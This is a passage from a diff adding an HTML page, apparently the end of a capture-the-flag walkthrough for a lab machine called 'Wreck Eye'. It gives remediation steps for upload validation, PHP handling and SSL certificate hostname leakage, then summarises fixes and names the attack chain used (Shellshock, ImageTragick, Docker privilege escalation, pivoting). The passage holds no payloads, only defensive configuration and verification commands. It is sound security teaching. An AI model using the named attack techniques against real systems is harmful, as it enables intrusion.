+<li>Use strong ciphers and key algorithms (e.g., <code>Ciphers aes256-ctr</code>, <code>HostKeyAlgorithms ssh-ed25519</code>).</li>
+<li>Enable public key authentication only (<code>PasswordAuthentication no</code>).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If SSH is managed programmatically, ensure only one instance is configured with secure defaults.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Run <code>nmap</code> to confirm only one SSH port is open and test SSH configurations for vulnerabilities.</li>
+</ul>
+</li>
+</ul>
+<h3 id="10-lack-of-input-validation-in-web-application">10. Lack of Input Validation in Web Application<a href="#10-lack-of-input-validation-in-web-application" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The web application on <code>calvin</code> (<code>/uploads</code>) lacked proper input validation, allowing arbitrary file uploads without checking file types or contents.</li>
+<li><strong>Impact</strong>: Facilitated ImageTragick exploitation by allowing malicious <code>.mvg</code> files.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Configure the web server (e.g., Nginx) to restrict file uploads to specific extensions using location blocks:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">location</span> <span style="color:#e6db74">/uploads</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">if</span> <span style="color:#e6db74">(</span>$request_filename <span style="color:#e6db74">!~</span> <span style="color:#e6db74">\.(jpg|jpeg|png|gif)</span>$<span style="color:#e6db74">)</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">return</span> <span style="color:#ae81ff">403</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>Limit upload size to prevent abuse (<code>client_max_body_size 1m</code> in Nginx).</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>Implement server-side validation in the upload handler to check file signatures (e.g., using <code>libmagic</code> to verify image formats).</li>
+<li>Sanitize uploaded files by stripping metadata or converting them to safe formats before processing.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Test uploads with non-image files (e.g., <code>.mvg</code>, <code>.php</code>) to ensure they are rejected.</li>
+</ul>
+</li>
+</ul>
+<h3 id="11-static-web-content-serving-php-files">11. Static Web Content Serving PHP Files<a href="#11-static-web-content-serving-php-files" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The <code>/blog</code> directory on <code>beehive</code> served PHP files as static content, exposing source code (e.g., <code>contact_me.php</code>) instead of executing it.</li>
+<li><strong>Impact</strong>: While not directly exploited, this exposed application logic and increased the attack surface.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Configure the web server to execute PHP files using a PHP handler (e.g., FastCGI with <code>php-fpm</code>):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">location</span> ~ <span style="color:#e6db74">\.php$</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">include</span> <span style="color:#e6db74">fastcgi_params</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">fastcgi_pass</span> <span style="color:#e6db74">unix:/run/php/php-fpm.sock</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">fastcgi_param</span> <span style="color:#e6db74">SCRIPT_FILENAME</span> $document_root$fastcgi_script_name;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>Alternatively, remove PHP files from static directories if execution is not intended.</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>Ensure sensitive logic in PHP scripts is protected or obfuscated if execution is disabled.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Access PHP files to confirm they either execute correctly or are inaccessible.</li>
+</ul>
+</li>
+</ul>
+<h3 id="12-exposed-network-information-via-ssl-certificate">12. Exposed Network Information via SSL Certificate<a href="#12-exposed-network-information-via-ssl-certificate" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The SSL certificate on port 443 exposed internal hostnames (<code>calvin.direct.ih.db</code>, <code>beehive.direct.ih.db</code>) via Subject Alternative Names (SANs).</li>
+<li><strong>Impact</strong>: Provided attackers with network topology hints, facilitating virtual host routing attacks.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Configure the SSL certificate to exclude internal hostnames from SANs, using only public-facing domains.</li>
+<li>Generate a new certificate with minimal information:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span style="color:#ae81ff">365</span> -nodes -subj <span style="color:#e6db74">&#34;/CN=direct.ih.db&#34;</span>
+</span></span></code></pre></div></li>
+<li>Use separate certificates for internal and external services to avoid leakage.</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If certificates are generated programmatically, ensure SANs are dynamically set to exclude internal hostnames.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Inspect the SSL certificate (<code>openssl s_client -connect [TARGET-IP]:443</code>) to confirm no internal hostnames are exposed.</li>
+</ul>
+</li>
+</ul>
+<h3 id="summary-of-fixes">Summary of Fixes<a href="#summary-of-fixes" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>WAF</strong>: Strengthen rules to block Shellshock consistently across all networks.</li>
+<li><strong>Bash</strong>: Upgrade to a patched version and disable unnecessary CGI scripts.</li>
+<li><strong>ImageMagick</strong>: Patch ImageMagick, restrict file formats, and validate uploads.</li>
+<li><strong>SSH Keys</strong>: Secure key storage, enforce strong passphrases, and limit access.</li>
+<li><strong>Root Password</strong>: Remove hardcoded credentials and use secret management.</li>
+<li><strong>Docker Group</strong>: Restrict <code>docker</code> group membership and socket access.</li>
+<li><strong>Docker Configs</strong>: Secure configuration files with strict permissions.</li>
+<li><strong>SSH Services</strong>: Consolidate to one port, harden configurations, and patch servers.</li>
+<li><strong>Web Application</strong>: Validate uploads and configure PHP execution correctly.</li>
+<li><strong>SSL Certificate</strong>: Remove internal hostnames from SANs.</li>
+</ul>
+<p>These fixes address the exploited vulnerabilities and misconfigurations, significantly reducing the attack surface and preventing similar attacks. Verification steps ensure each fix is effective.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Wreck Eye is an excellent machine that demonstrates the complexity of network segmentation and container exploitation. It requires expertise in:</p>
+<ul>
+<li>Network reconnaissance and virtual host enumeration</li>
+<li>Shellshock and ImageTragick vulnerability exploitation</li>
+<li>SSH key management and network pivoting techniques</li>
+<li>Docker container security and privilege escalation</li>
+<li>Multi-layer network architecture exploitation</li>
+<li>Advanced penetration testing methodologies across segmented networks</li>
+</ul>
+<p>The machine emphasizes the importance of proper network segmentation, container security, WAF configuration, and vulnerability management in enterprise environments.</p>
+<hr>
+<p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
